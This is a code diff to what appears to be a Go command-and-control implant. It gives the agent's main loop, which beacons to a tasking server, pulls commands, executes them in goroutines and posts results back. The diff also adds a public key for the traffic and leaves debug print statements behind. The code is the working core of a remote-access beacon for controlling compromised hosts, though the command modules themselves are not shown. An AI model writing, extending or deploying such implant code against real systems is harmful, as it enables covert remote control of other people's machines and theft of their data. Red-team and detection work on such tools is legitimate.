@@ -2,8 +2,10 @@ package main
 
 import (
 	"encoding/json"
+	"fmt"
 	"os"
 	"os/user"
+	"reflect"
 	"runtime"
 	"time"
 
@@ -33,8 +35,10 @@ type Command struct {
 }
 
 // Define Base URL (default localhost 9000)
-var autodiscover = true
 var base_url = "http://localhost:9000/api/v1/ping"
+var autodiscover = true
+var public_key_string string
+
 var relay_for []string
 
 // Get details from userspace
@@ -55,6 +59,7 @@ var exit_process = false
 var function_mapping = Mapping.FunctionMapping()
 
 func main() {
+	fmt.Println(public_key_string)
 	// Generate global beacon_id and start beaconin process (same thread)
 	beacon_id = Modules.GenerateID(beacon_username)
 	StartBeacon()
@@ -71,16 +76,19 @@ func StartBeacon() {
 
 func StartPulse() {
 	// Send pulse and start threads to execute tasks
-	pulse_result := Networking.SendPulse(BeaconData(), base_url)
-	task_list := pulse_result.([]interface{})
-	for _, task := range task_list {
-		task_mapping := task.(map[string]interface{})
-		task_id := task_mapping["_id"].(map[string]interface{})
-		task_iod := task_id["$oid"].(string)
-		commands := task_mapping["commands"].([]interface{})
-		go ExecuteTasks(task_iod, commands)
+	pulse_result := Networking.SendPulse(BeaconData(), base_url, public_key_string)
+	response_type := reflect.TypeOf(pulse_result).String()
+	if response_type == "[]interface {}" {
+		fmt.Println("k")
+		task_list := pulse_result.([]interface{})
+		for _, task := range task_list {
+			task_mapping := task.(map[string]interface{})
+			task_id := task_mapping["_id"].(map[string]interface{})
+			task_iod := task_id["$oid"].(string)
+			commands := task_mapping["commands"].([]interface{})
+			go ExecuteTasks(task_iod, commands)
+		}
 	}
-
 }
 
 func BeaconData() []byte {
@@ -113,7 +121,7 @@ func ExecuteTasks(task_iod string, commands []interface{}) {
 
 		time.Sleep(time.Duration(cmd_sleep) * time.Second)
 		json_object, _ := json.Marshal(result)
-		Networking.SendResult(base_url, json_object)
+		Networking.SendResult(base_url, json_object, public_key_string)
 
 	}
 }
